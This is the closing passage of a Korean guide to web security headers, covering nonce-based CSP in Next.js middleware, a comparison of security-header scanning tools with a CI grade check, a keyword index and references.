
    const response = NextResponse.next();

    response.headers.set('Content-Security-Policy', cspHeader);
    response.headers.set('x-nonce', nonce);

    return response;
}

// app/layout.tsx에서 nonce 사용:
// import { headers } from 'next/headers';
// const nonce = headers().get('x-nonce') ?? '';
// <Script nonce={nonce} ... />
```

```
┌──────────────────────────────────────────────────────────────────────────────┐
│  Next.js CSP 주의사항:                                                        │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  1. next.config.js headers()는 정적 설정 → nonce 불가                         │
│     → middleware.ts에서 동적 nonce 생성                                       │
│                                                                              │
│  2. Next.js의 인라인 스크립트:                                                │
│     _next/static 스크립트는 'self'로 커버                                     │
│     __NEXT_DATA__ 인라인 스크립트에 nonce 필요                                │
│                                                                              │
│  3. App Router vs Pages Router:                                              │
│     App Router: middleware + Server Component에서 nonce 전달                  │
│     Pages Router: _document.tsx에서 nonce 전달                               │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

# 18. 보안 헤더 스캐너 도구

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              보안 헤더 스캐너 비교                                              │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ■ securityheaders.com (Scott Helme)                                         │
│  ─────────────────────────────────────────────────────────────────            │
│  등급: A+ ~ F                                                                │
│  검사 항목:                                                                   │
│  ├── Content-Security-Policy                                                 │
│  ├── Strict-Transport-Security                                               │
│  ├── X-Content-Type-Options                                                  │
│  ├── X-Frame-Options                                                         │
│  ├── Referrer-Policy                                                         │
│  ├── Permissions-Policy                                                      │
│  └── X-XSS-Protection (deprecated 확인)                                      │
│  API: 있음 (CI/CD 통합 가능)                                                  │
│  비용: 무료                                                                   │
│                                                                              │
│  ■ Mozilla Observatory (observatory.mozilla.org)                             │
│  ─────────────────────────────────────────────────────────────────            │
│  점수: 0 ~ 135점 (A+ ~ F 등급)                                               │
│  검사 항목: securityheaders.com + 추가                                        │
│  ├── Cookie 보안 (HttpOnly, Secure, SameSite)                                │
│  ├── CORS 설정                                                               │
│  ├── Redirection (HTTP → HTTPS)                                              │
│  └── SRI 사용 여부                                                           │
│  누적 스캔: 6,900만+ 사이트                                                   │
│  API: 있음                                                                    │
│  비용: 무료, 오픈소스                                                         │
│                                                                              │
│  ■ Google Lighthouse                                                         │
│  ─────────────────────────────────────────────────────────────────            │
│  Best Practices 섹션에서 보안 헤더 검사                                       │
│  ├── HTTPS 여부                                                              │
│  ├── CSP 존재 여부                                                           │
│  ├── X-Content-Type-Options                                                  │
│  └── 취약한 JavaScript 라이브러리 감지                                        │
│  Chrome DevTools에 내장                                                      │
│  비용: 무료                                                                   │
│                                                                              │
│  ■ Hardenize (hardenize.com)                                                 │
│  ─────────────────────────────────────────────────────────────────            │
│  가장 포괄적인 검사:                                                          │
│  ├── 보안 헤더 전체                                                          │
│  ├── TLS 설정 (인증서, 프로토콜, 암호 스위트)                                  │
│  ├── DNS 보안 (DNSSEC, CAA)                                                  │
│  ├── 이메일 보안 (SPF, DKIM, DMARC)                                          │
│  └── 쿠키 보안                                                               │
│  비용: 기본 무료, 프로 유료                                                   │
│                                                                              │
│  ■ CLI 도구                                                                  │
│  ─────────────────────────────────────────────────────────────────            │
│  # curl로 헤더 직접 확인                                                      │
│  curl -I https://example.com                                                 │
│                                                                              │
│  # shcheck (Python)                                                          │
│  pip install shcheck                                                         │
│  shcheck https://example.com                                                 │
│                                                                              │
│  # CSP Evaluator (Google)                                                    │
│  https://csp-evaluator.withgoogle.com/                                       │
│  → CSP 정책의 강도를 분석하고 약점 지적                                       │
│                                                                              │
│  CI/CD 통합 예시 (GitHub Actions):                                           │
│  ─────────────────────────────────────────────────────────────────            │
│  - name: Check security headers                                             │
│    run: |                                                                    │
│      GRADE=$(curl -s "https://securityheaders.com/?q=https://                │
│        example.com&hide=on&followRedirects=on" | grep -oP                    │
│        'class="grade_\K[^"]+')                                               │
│      if [[ "$GRADE" != "a-plus" && "$GRADE" != "a" ]]; then                  │
│        echo "Security headers grade: $GRADE (expected A or A+)"              │
│        exit 1                                                                │
│      fi                                                                      │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

# 19. 키워드 색인

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                     키워드 색인 (가나다/ABC 순)                                  │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ㄱ                                                                          │
│  공급망 공격 ─────────────────── 10.2 SRI, 16.5 Polyfill.io                  │
│  교차 출처 격리 ─────────────── 8장 (COOP/COEP/CORP)                         │
│  권한 정책 ──────────────────── 9.1 Permissions-Policy                       │
│                                                                              │
│  ㄴ                                                                          │
│  논스 (nonce) ───────────────── 4.1.3, 4.1.6, 17장 (프레임워크별)            │
│                                                                              │
│  ㄷ                                                                          │
│  도메인 allowlist ───────────── 3 CSP 세대, 15 안티패턴 11                   │
│                                                                              │
│  ㅁ                                                                          │
│  MIME 스니핑 ────────────────── 7.1 X-Content-Type-Options                   │
│                                                                              │
│  ㅂ                                                                          │
│  보안 헤더 스캐너 ───────────── 18장                                          │
│  브라우저 지원 ──────────────── 11 종합 비교표                                │
│                                                                              │
│  ㅅ                                                                          │
│  사이드 채널 ────────────────── 8장 (Spectre)                                │
│  심층 방어 (Defense in Depth) ─ 2.2                                           │
│  서드파티 ───────────────────── 4.1.7 GTM, 10.2 SRI, 14 베스트 프랙티스 8    │
│                                                                              │
│  ㅇ                                                                          │
│  안티패턴 ───────────────────── 15장 (12가지)                                │
│                                                                              │
│  ㅈ                                                                          │
│  진화 타임라인 ──────────────── 3장                                           │
│                                                                              │
│  ㅋ                                                                          │
│  캐시 제어 ──────────────────── 10.4 Cache-Control                           │
│  클릭재킹 ───────────────────── 5장                                          │
│                                                                              │
│  ㅎ                                                                          │
│  HSTS ───────────────────────── 6장                                          │
│  HSTS Preload ───────────────── 6.3                                          │
│                                                                              │
│  A-Z                                                                         │
│  ACM CCS 2016 ───────────────── 16.1 Google ("CSP Is Dead")                 │
│  Apache ─────────────────────── 17.2                                         │
│  AWS CloudFront ─────────────── 16.5                                         │
│  Azure Front Door ───────────── 16.5                                         │
│  base-uri ───────────────────── 4.1.2, 4.1.5 (우회 기법 3)                  │
│  CERT CA-2000-02 ────────────── 3 타임라인 (2000)                            │
│  Clear-Site-Data ────────────── 10.3                                         │
│  Clickjacking ───────────────── 5.1                                          │
│  Cloudflare ─────────────────── 16.5                                         │
│  COEP ───────────────────────── 8.3                                          │
│  COOP ───────────────────────── 8.2                                          │
│  CORP ───────────────────────── 8.4                                          │
│  CORS ───────────────────────── 10.1                                         │
│  CSP ────────────────────────── 4.1 (전체 상세)                              │
│  CSP directive ──────────────── 4.1.2                                        │
│  CSP Evaluator ──────────────── 18                                           │
│  CSP Reporting ──────────────── 4.1.8                                        │
│  CSP 세대 진화 ──────────────── 3 (Allowlist→Nonce→strict-dynamic→TT)       │
│  CSP 우회 기법 ──────────────── 4.1.5                                        │
│  Defense in Depth ───────────── 2.2                                          │
│  DOM XSS ────────────────────── 4.3 Trusted Types                           │
│  Dropbox ────────────────────── 16.4 (4부작 블로그)                          │
│  Express.js ─────────────────── 17.4                                         │
│  Feature-Policy ─────────────── 9.1 (→ Permissions-Policy)                  │
│  frame-ancestors ────────────── 5.3                                          │
│  GCP Cloud LB ───────────────── 16.5                                         │
│  GitHub ─────────────────────── 16.3                                         │
│  Google ─────────────────────── 16.1                                         │
│  GTM ────────────────────────── 4.1.7                                        │
│  Hardenize ──────────────────── 18                                           │
│  helmet.js ──────────────────── 17.4                                         │
│  HSTS ───────────────────────── 6.2                                          │
│  Lighthouse ─────────────────── 18                                           │
│  Meltdown ───────────────────── 8.1                                          │
│  Mozilla Observatory ────────── 18                                           │
│  Next.js ────────────────────── 17.5                                         │
│  Nginx ──────────────────────── 17.1                                         │
│  NIST SP 800-53 ─────────────── 13.4 (금융 서비스)                           │
│  nonce ──────────────────────── 4.1.3, 4.1.6                                │
│  object-src ─────────────────── 4.1.5 (우회 기법 4)                          │
│  OWASP ──────────────────────── 1 용어 사전, 3 타임라인                      │
│  OWASP Top 10 ───────────────── 3 타임라인 (2007, 2017, 2021)               │
│  PCI DSS v4 ─────────────────── 13.5 이커머스                                │
│  Permissions-Policy ─────────── 9.1                                          │
│  Polyfill.io ────────────────── 16.5                                         │
│  Preload List ───────────────── 6.3                                          │
│  Referrer-Policy ────────────── 9.2                                          │
│  Report-Only ────────────────── 4.1.4                                        │
│  RFC 1945 ───────────────────── 9.2 (Referer 오타)                           │
│  RFC 6797 ───────────────────── 6.2 (HSTS)                                  │
│  RFC 7034 ───────────────────── 5.2 (X-Frame-Options)                       │
│  Same-Origin Policy ─────────── 10.1 (CORS)                                 │
│  Samy Worm ──────────────────── 3 타임라인 (2005)                            │
│  secure_headers gem ─────────── 16.3 GitHub                                 │
│  securityheaders.com ────────── 18                                           │
│  Shopify ────────────────────── 16.5                                         │
│  Spectre ────────────────────── 8.1                                          │
│  Spring Security ────────────── 17.3                                         │
│  SRI ────────────────────────── 10.2                                         │
│  SSL Stripping ──────────────── 6.1                                          │
│  strict-dynamic ─────────────── 4.1.6 (Google 권장 CSP)                     │
│  TOFU ───────────────────────── 6.2 (HSTS 한계)                             │
│  Trusted Types ──────────────── 4.3                                          │
│  Twitter ────────────────────── 16.2                                         │
│  unsafe-eval ────────────────── 4.1.3, 15 안티패턴 1                        │
│  unsafe-inline ──────────────── 4.1.3, 15 안티패턴 1                        │
│  X-Content-Type-Options ─────── 7.1                                          │
│  X-Frame-Options ────────────── 5.2                                          │
│  X-XSS-Protection ──────────── 4.2 (deprecated)                             │
│  XSS ────────────────────────── 4장 전체                                     │
│  XSS Auditor ────────────────── 4.2                                          │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

> **참고 문헌**:
> - RFC 6797 — HTTP Strict Transport Security (HSTS)
> - RFC 7034 — HTTP Header Field X-Frame-Options
> - W3C Content Security Policy Level 1/2/3
> - Lukas Weichselbaum et al., "CSP Is Dead, Long Live CSP!" (ACM CCS 2016)
> - OWASP Secure Headers Project (owasp.org/www-project-secure-headers)
> - NIST SP 800-53 Rev. 5 — Security and Privacy Controls
> - Mozilla MDN Web Docs — HTTP Headers
> - Google Web Fundamentals — Content Security Policy
> - Dropbox Engineering Blog — "On CSP Reporting and Filtering"

---

*끝.*
